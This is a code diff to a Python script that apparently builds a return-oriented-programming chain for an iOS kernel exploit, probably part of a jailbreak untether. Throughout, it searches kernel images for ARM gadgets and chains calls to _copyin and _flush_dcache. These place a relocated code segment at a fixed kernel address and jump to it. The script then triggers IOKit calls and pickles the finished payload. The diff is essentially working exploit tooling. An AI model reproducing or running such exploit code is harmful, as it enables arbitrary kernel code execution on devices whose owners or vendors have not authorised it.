@@ -41,14 +41,12 @@ def dbg_result():
 
         funcall('_fprintf', dmini.cur.sym('___stderrp'), ptr('Result for %s:%d was %%08x\n' % (back.f_code.co_filename, back.f_lineno), True), result, load_r0=True)
 
-dmini.init(cachefile, True)
-
 dmini.init(kernfile, False)
 
 sysent = dmini.cur.find_basic('- 00 10 86 00') + 4
 
 code_addr = 0x80000400 # XXX
-weirdfile = dmini.Connection(kcode, rw=True).relocate(dmini.cur, code_addr).nth_segment(0)[:-8]
+weirdfile = dmini.Connection(kcode, rw=True).relocate(dmini.cur, code_addr).nth_segment(0).data()[:-8]
 count = 0
 stuff = ''
 while True:
@@ -68,10 +66,10 @@ def mov_r0_r6():
     exhaust_fwd('R4', 'R5', 'R6')
     heapadd(fwd('R4'), fwd('R5'), fwd('R6'), fwd('PC'))
 
-def lsl_r5_r7_1():
-    set_fwd('PC', dmini.cur.find_basic('+ 7d 00 cc bd'))
-    exhaust_fwd('R2', 'R3', 'R5', 'R6', 'R7')
-    heapadd(fwd('R2'), fwd('R3'), fwd('R6'), fwd('R7'), fwd('PC'))
+def str_r7_sp_856():
+    set_fwd('PC', dmini.cur.find_basic('+ d6 97 e9 bd'))
+    exhaust_fwd('R0', 'R3', 'R5', 'R6', 'R7')
+    heapadd(fwd('R0'), fwd('R3'), fwd('R5'), fwd('R6'), fwd('R7'), fwd('PC'))
 
 def seek_kernel_ldm(reg):
     s = chr(0x90 | reg) + chr(0xe8)
@@ -89,7 +87,7 @@ def seek_kernel_ldm(reg):
             if 'SP' not in regs or 'PC' not in regs: continue
             if 'R0' in regs or 'R7' in regs: continue
             # got it
-            return (dmini.cur.nth_segment_addr(seg) + i - 2, regs)
+            return (dmini.cur.nth_segment(seg).start + i - 2, regs)
         
         seg += 1
 
@@ -100,23 +98,24 @@ kernel_ldm, kernel_ldm_regs = seek_kernel_ldm(11 if four_dot_three else 6)
 init(*kernel_ldm_regs)
 
 #set_fwd('PC', 0xdeadbeee); heapadd(fwd('PC'))
+obj = ptrI(0)
     
 m = pointed('')
 set_fwd('SP', pointer(m))
 heapadd(m)
-obj = ptrI(0)
 mov_r0_r6()
-lsl_r5_r7_1()
 store_r0_to(obj)
+str_r7_sp_856()
+
 make_r4_avail()
 funcall('_copyin', pointer(weirdfile), code_addr, len(weirdfile))
 funcall('_flush_dcache', code_addr, len(weirdfile), 0)
-load_r0_from(obj)
+set_fwd('R4', obj)
 set_fwd('PC', code_addr)
 
+
 kstuff = finalize(None, must_be_simple=False)
-#heapdump(kstuff)
-#assert len(kstuff) == 0x70
+kstuff += '\0'*(856 + 0x38 + 4 - len(kstuff)) # xxx offset
 
 dmini.init(cachefile, True)
 
@@ -167,6 +166,8 @@ else:
     transaction[0x70:0x74] = I(6)
 transaction = simplify(transaction)
 
+set_r0_to(kstuffp); dbg_result()
+
 # The manpage says this returns EINVAL, but in fact the kernel handles it.
 funcall('_mlock', kstuffp, len(kstuff)); dbg_result()
 
@@ -174,7 +175,7 @@ zerop = ptrI(0)
 
 if mode == 'untether':
     # XXX is this necessary? it's from star
-    funcall('iokit._IOKitWaitQuiet', 0, ptrI(0, 0, 0))
+    funcall('iokit._IOKitWaitQuiet', 0, 0)#ptrI(0, 0, 0))
 
 funcall('iokit._IOServiceMatching', ptr('AppleRGBOUT', True))
 #funcall('iokit._IOServiceMatching', ptr('AppleCLCD', True))
@@ -250,4 +251,4 @@ else:
 
     final = finalize(address)
     #heapdump(final)
-    open('two.txt', 'w').write(pickle.dumps({'segment': final, 'initializer': initializer, 'init_sp': init_sp, 'rop_address': address, 'libs': lib_paths}))
+    open('two.txt', 'w').write(pickle.dumps({'segment': final, 'initializer': initializer, 'init_sp': init_sp, 'rop_address': address, 'libs': lib_paths, 'dylib': False}))
